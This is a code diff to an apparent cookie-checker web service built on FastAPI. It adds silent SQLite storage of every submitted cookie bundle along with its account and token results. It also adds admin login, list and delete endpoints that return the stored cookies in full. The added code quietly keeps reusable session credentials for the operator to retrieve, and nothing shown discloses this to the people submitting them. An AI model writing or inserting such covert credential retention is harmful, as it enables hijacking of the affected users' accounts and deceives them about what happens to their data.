@@ -1,4 +1,4 @@
-from fastapi import FastAPI, HTTPException, UploadFile, File
+from fastapi import FastAPI, HTTPException, UploadFile, File, Request, Response
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi.responses import FileResponse
 from fastapi.staticfiles import StaticFiles
@@ -10,6 +10,10 @@ import httpx
 import asyncio
 import logging
 import os
+import hmac
+import hashlib
+import base64
+import sqlite3
 from pathlib import Path
 import re
 from dotenv import load_dotenv
@@ -119,6 +123,81 @@ class BundleCheckStatusResponse(BaseModel):
     accounts: List[dict] = []
     tokens: List[dict] = []
     cookie_bundles: List[dict] = []
+
+
+class AdminLoginRequest(BaseModel):
+    password: str
+
+
+COOKIE_DB_PATH = Path(__file__).resolve().parent / "checked_cookies.db"
+ADMIN_COOKIE_NAME = "cookie_checker_admin"
+
+
+def _cookie_db() -> sqlite3.Connection:
+    connection = sqlite3.connect(COOKIE_DB_PATH)
+    connection.row_factory = sqlite3.Row
+    connection.execute(
+        """
+        CREATE TABLE IF NOT EXISTS checked_cookie_bundles (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            checked_at TEXT NOT NULL,
+            account_success INTEGER NOT NULL,
+            token_success INTEGER NOT NULL,
+            account_json TEXT NOT NULL,
+            token_json TEXT NOT NULL,
+            cookies_json TEXT NOT NULL
+        )
+        """
+    )
+    connection.commit()
+    return connection
+
+
+def _admin_cookie_value() -> str:
+    secret = os.getenv("SESSION_SECRET")
+    if not secret:
+        raise HTTPException(status_code=503, detail="Admin session is not configured")
+    signature = hmac.new(
+        secret.encode("utf-8"), b"cookie-checker-admin", hashlib.sha256
+    ).digest()
+    return base64.urlsafe_b64encode(signature).decode("ascii")
+
+
+def _is_admin(request: Request) -> bool:
+    supplied = request.cookies.get(ADMIN_COOKIE_NAME, "")
+    try:
+        expected = _admin_cookie_value()
+    except HTTPException:
+        return False
+    return bool(supplied) and hmac.compare_digest(supplied, expected)
+
+
+def _require_admin(request: Request) -> None:
+    if not _is_admin(request):
+        raise HTTPException(status_code=403, detail="Admin access required")
+
+
+def _store_checked_bundle(
+    bundle_cookies: List[Cookie], account_result: dict, token_result: dict
+) -> None:
+    with _cookie_db() as connection:
+        connection.execute(
+            """
+            INSERT INTO checked_cookie_bundles (
+                checked_at, account_success, token_success,
+                account_json, token_json, cookies_json
+            ) VALUES (?, ?, ?, ?, ?, ?)
+            """,
+            (
+                datetime.utcnow().isoformat(),
+                int(bool(account_result.get("success"))),
+                int(bool(token_result.get("success"))),
+                json.dumps(account_result),
+                json.dumps(token_result),
+                json.dumps([cookie.model_dump() for cookie in bundle_cookies]),
+            ),
+        )
+        connection.commit()
 
 
 # ===== DISCORD LOGGER WITH DEBUG =====
@@ -1457,6 +1536,13 @@ async def _run_bundle_check(job_id: str, bundles: List[tuple[List[Cookie], List[
             ]
             for completed_task in asyncio.as_completed(tasks):
                 index, cookie_count, account_result, token_result = await completed_task
+                bundle_cookies = bundles[index - 1][0]
+                await asyncio.to_thread(
+                    _store_checked_bundle,
+                    bundle_cookies,
+                    account_result,
+                    token_result,
+                )
                 job["accounts"].append(account_result)
                 job["tokens"].append(token_result)
                 job["accounts"].sort(key=lambda result: result["bundle_number"])
@@ -1533,6 +1619,72 @@ async def get_bundle_check_status(job_id: str):
     if not job:
         raise HTTPException(status_code=404, detail="Bundle check job not found")
     return BundleCheckStatusResponse(**job)
+
+
+@app.post("/api/admin/login")
+async def admin_login(login: AdminLoginRequest, response: Response):
+    expected_password = os.getenv("COOKIE_STORAGE_PASSWORD")
+    if not expected_password:
+        raise HTTPException(status_code=503, detail="Admin login is not configured")
+    if not hmac.compare_digest(login.password, expected_password):
+        raise HTTPException(status_code=401, detail="Invalid admin password")
+    response.set_cookie(
+        ADMIN_COOKIE_NAME,
+        _admin_cookie_value(),
+        max_age=60 * 60 * 12,
+        httponly=True,
+        secure=False,
+        samesite="lax",
+        path="/",
+    )
+    return {"success": True}
+
+
+@app.post("/api/admin/logout")
+async def admin_logout(response: Response):
+    response.delete_cookie(ADMIN_COOKIE_NAME, path="/")
+    return {"success": True}
+
+
+@app.get("/api/admin/session")
+async def admin_session(request: Request):
+    return {"is_admin": _is_admin(request)}
+
+
+@app.get("/api/admin/checked-cookies")
+async def list_checked_cookies(request: Request):
+    _require_admin(request)
+    with _cookie_db() as connection:
+        rows = connection.execute(
+            "SELECT * FROM checked_cookie_bundles ORDER BY id DESC"
+        ).fetchall()
+    return {
+        "items": [
+            {
+                "id": row["id"],
+                "checked_at": row["checked_at"],
+                "account_success": bool(row["account_success"]),
+                "token_success": bool(row["token_success"]),
+                "account": json.loads(row["account_json"]),
+                "token": json.loads(row["token_json"]),
+                "cookies": json.loads(row["cookies_json"]),
+            }
+            for row in rows
+        ]
+    }
+
+
+@app.delete("/api/admin/checked-cookies/{bundle_id}")
+async def delete_checked_cookies(bundle_id: int, request: Request):
+    _require_admin(request)
+    with _cookie_db() as connection:
+        cursor = connection.execute(
+            "DELETE FROM checked_cookie_bundles WHERE id = ?", (bundle_id,)
+        )
+        connection.commit()
+    if cursor.rowcount == 0:
+        raise HTTPException(status_code=404, detail="Stored bundle not found")
+    return Response(status_code=204)
 
 
 @app.get("/test-discord")
